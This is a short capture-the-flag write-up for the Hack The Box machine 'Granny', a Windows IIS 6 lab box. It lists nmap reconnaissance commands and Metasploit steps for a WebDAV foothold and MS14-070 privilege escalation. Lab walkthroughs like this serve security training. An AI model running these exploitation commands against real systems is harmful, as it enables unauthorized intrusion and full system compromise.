# Hack the box - Granny

<img align="left" src="logo.png">
&nbsp;<span style="color:#b5e853; font-weight: bold">OS: <img align="top" src="../../../images/windows.png"> </span><b>Windows</b>
&nbsp;<span style="color:#b5e853; font-weight: bold">IP: </span><b>10.10.10.15</b>

&nbsp;<span style="color:#b5e853; font-weight: bold">Difficulity: </span><b>Easy</b>
&nbsp;<span style="color:#b5e853; font-weight: bold">Release: </span><b>2017 Apr 12</b>

___

## Port scanning

```
nmap -sC -sV -T4 -oA nmap 10.10.10.15
```

![Nmap results](./nmap.png)

There ISS 6 web server running on this machine.

## Exploitation

We can run nmap again for checking vulnerabilities:

```
nmap -p 80 --script="*iis*" 10.10.10.15
```

![Nmap vulnerability scan](nmap_vulns.png)

WebDAV is ENABLED. We can try to exploit this vulnerability:

![Exploitation](exploitation.png)

Great! We have a shell. Since we cannot check for current user, we can try migrating to process:

![Getting user](getting_user.png)

## Privilege escalation

Time to explore potential privilege escalation exploits:

```
background
use post/multi/recon/local_exploit_suggester
set session 1
run
```

![Privilege escalation scan](priv_esc_scan.png)

Machine is vulnerable to many exploits. 3rd one seems to work:

```
use exploit/windows/local/ms14_070_tcpip_ioctl
set session 1
run
```

![Privilege escalation](priv_esc.png)

## Capturing flags

Last thing to is to capture flags:

![Flags](flags_capture.png)